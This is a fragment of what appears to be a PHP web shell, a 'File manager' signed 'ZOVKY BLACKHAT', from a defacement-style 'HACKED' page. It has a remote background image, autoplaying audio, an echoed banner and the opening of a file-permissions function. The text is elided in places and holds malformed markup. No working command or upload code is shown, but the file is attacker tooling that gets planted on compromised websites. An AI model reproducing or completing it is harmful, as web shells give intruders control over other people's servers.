...
<html>
  <head>
    <title>HACKED ZOVKY BLACKHAT</title>
    <style>
html,body,.container{
            background: url(https://c.top4top.io/p_2261zdj6x0.jpg) no-repeat center center/cover;
            position: fixed;
            margin: auto;
            height: 100%;
...
<BODY>
<H1><center>ZOVKY BLACKHAT File manager</center></H1>
...
echo '<br />File Manager Version <font color="red">1.0</font>, Coded By ZOVKY BLACKHAT<font color="red">ZOVKY BLACKHAT~ The BURON POLDA</font>
<br><br>center><audio controls="controls" autoplay="autoplay" src="https://www.mboxdrive.com/DJ%20ELIMI%20TUT%20YANG%20SEDANG%20VIRAL%20TIKTOK.mp3">
</BODY>
</HTML>';
function perms($file){
